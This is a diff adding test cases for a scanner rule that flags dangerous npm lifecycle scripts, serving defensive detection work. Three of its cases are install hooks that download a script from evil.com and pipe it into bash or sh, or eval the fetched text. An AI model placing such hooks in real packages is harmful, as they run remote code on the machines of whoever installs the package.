@@ -1,0 +1,11 @@
+# DEP-001: Dangerous lifecycle script
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+"postinstall": "curl http://evil.com/script.sh | bash"
+"preinstall": "wget http://evil.com/install.sh | sh"
+"postinstall": "eval $(curl http://evil.com)"
+
+# === Cases that should NOT be detected ===
+"postinstall": "npm run build"
+"test": "jest"
